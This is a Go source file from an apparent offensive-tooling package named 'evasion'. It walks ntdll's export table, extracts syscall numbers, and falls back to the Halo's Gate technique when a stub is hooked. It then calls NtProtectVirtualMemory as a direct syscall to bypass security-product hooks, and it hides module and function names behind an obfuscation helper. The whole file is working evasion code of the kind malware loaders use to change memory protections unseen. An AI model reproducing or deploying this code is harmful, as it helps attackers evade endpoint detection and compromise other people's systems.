//go:build windows

package evasion

import (
	"encoding/binary"
	"strings"
	"unsafe"
)

// resolveExport walks the export directory of a loaded DLL (given its base address)
// and returns the VA of an exported function by name. No GetProcAddress call.
func resolveExport(base uintptr, funcName string) uintptr {
	// Parse PE headers
	dosHdr := base
	peOffset := *(*uint32)(unsafe.Pointer(dosHdr + 0x3C))
	peBase := base + uintptr(peOffset)

	// Check PE signature
	sig := *(*uint32)(unsafe.Pointer(peBase))
	if sig != 0x00004550 { // "PE\0\0"
		return 0
	}

	// Optional header offset: PE + 4 (sig) + 20 (COFF header)
	optBase := peBase + 4 + 20

	// Data directory 0 = Export Directory
	// In PE32+: starts at optBase + 112
	exportRVA := *(*uint32)(unsafe.Pointer(optBase + 112))
	if exportRVA == 0 {
		return 0
	}
	exportDir := base + uintptr(exportRVA)

	numFunctions := *(*uint32)(unsafe.Pointer(exportDir + 20))
	numNames := *(*uint32)(unsafe.Pointer(exportDir + 24))
	funcTableRVA := *(*uint32)(unsafe.Pointer(exportDir + 28))
	nameTableRVA := *(*uint32)(unsafe.Pointer(exportDir + 32))
	ordTableRVA := *(*uint32)(unsafe.Pointer(exportDir + 36))

	_ = numFunctions

	nameTable := base + uintptr(nameTableRVA)
	ordTable := base + uintptr(ordTableRVA)
	funcTable := base + uintptr(funcTableRVA)

	for i := uint32(0); i < numNames; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(nameTable + uintptr(i)*4))
		namePtr := base + uintptr(nameRVA)
		// Read null-terminated string
		var name []byte
		for j := uintptr(0); ; j++ {
			c := *(*byte)(unsafe.Pointer(namePtr + j))
			if c == 0 {
				break
			}
			name = append(name, c)
		}
		if string(name) == funcName {
			ord := *(*uint16)(unsafe.Pointer(ordTable + uintptr(i)*2))
			funcRVA := *(*uint32)(unsafe.Pointer(funcTable + uintptr(ord)*4))
			return base + uintptr(funcRVA)
		}
	}
	return 0
}

// ExtractSSN reads the syscall service number from an Nt* stub.
// Windows syscall stubs follow the pattern:
//   4C 8B D1       mov r10, rcx
//   B8 XX XX XX XX mov eax, <SSN>
//   ...
//   0F 05          syscall
// We read 4 bytes at offset +4 after the `mov r10, rcx` preamble.
func ExtractSSN(funcVA uintptr) uint32 {
	if funcVA == 0 {
		return 0
	}
	// Detect Hooked stubs: first byte should be 4C (mov r10,rcx), not E9 (jmp — hook)
	first := *(*byte)(unsafe.Pointer(funcVA))
	if first == 0xE9 { // JMP — hooked! Walk neighbours (Halos Gate)
		return halesGateSSN(funcVA)
	}
	// Standard: SSN at offset 4
	ssnBytes := (*[4]byte)(unsafe.Pointer(funcVA + 4))
	return binary.LittleEndian.Uint32(ssnBytes[:])
}

// halesGateSSN searches neighbouring syscall stubs for an unhooked SSN (Halos Gate technique).
// Each Nt* stub is 32 bytes apart on modern Windows. We check ±N neighbours.
func halesGateSSN(hookedVA uintptr) uint32 {
	const stubSize = 32
	for i := 1; i < 10; i++ {
		// Check above
		above := hookedVA - uintptr(i)*stubSize
		if *(*byte)(unsafe.Pointer(above)) != 0xE9 {
			ssn := binary.LittleEndian.Uint32((*[4]byte)(unsafe.Pointer(above + 4))[:])
			return ssn - uint32(i) // adjust for offset
		}
		// Check below
		below := hookedVA + uintptr(i)*stubSize
		if *(*byte)(unsafe.Pointer(below)) != 0xE9 {
			ssn := binary.LittleEndian.Uint32((*[4]byte)(unsafe.Pointer(below + 4))[:])
			return ssn + uint32(i)
		}
	}
	return 0
}

// syscallTable caches resolved SSNs to avoid repeated scanning.
var syscallTable = map[string]uint32{}

// GetSSN returns the syscall number for a given Nt* function name.
// Uses PEB walk + export table traversal + Halos Gate fallback.
func GetSSN(funcName string) uint32 {
	if ssn, ok := syscallTable[funcName]; ok {
		return ssn
	}
	ntdll := FindModule(strings.ToLower(Obf(SNtdll)))
	if ntdll == nil {
		return 0
	}
	va := resolveExport(ntdll.Base, funcName)
	ssn := ExtractSSN(va)
	syscallTable[funcName] = ssn
	return ssn
}

// NtProtectVirtualMemory calls NtProtectVirtualMemory via direct syscall.
// This bypasses any hooks in ntdll.dll.
func NtProtectVirtualMemory(procHandle uintptr, baseAddr *uintptr, regionSize *uintptr, newProtect uint32, oldProtect *uint32) uintptr {
	ssn := GetSSN(Obf(SNtProtectVM))
	r1, _, _ := doSyscall(uintptr(ssn), 5,
		procHandle,
		uintptr(unsafe.Pointer(baseAddr)),
		uintptr(unsafe.Pointer(regionSize)),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(oldProtect)),
		0,
	)
	return r1
}
